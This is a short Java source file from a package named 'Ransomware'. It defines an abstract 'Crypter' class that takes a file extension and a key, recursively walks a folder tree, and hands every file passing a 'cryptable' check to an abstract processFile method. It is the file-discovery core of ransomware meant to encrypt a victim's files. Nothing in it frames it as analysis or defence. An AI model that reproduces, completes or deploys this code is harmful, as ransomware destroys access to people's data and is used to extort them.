package Ransomware;

import java.io.File;

public abstract class Crypter {
    protected FileFilter fileFilter;
    private final String key;
    protected GeneratorFilePath generatorFilePath;

    public Crypter(String ext,String key){
        this.fileFilter = new FileFilter(ext);
        this.key = key;
        this.generatorFilePath = new GeneratorFilePath(ext);
    }

    public abstract void processFile(File in);

    public void processFiles(File folder){
        for(File file : folder.listFiles()){
            if(!file.isDirectory()){
                if(isCryptableFile(file))
                    processFile(file);
            }else
                processFiles(file);
        }
    }

    public String getKey(){return key;}
    public abstract boolean isCryptableFile(File file);
}
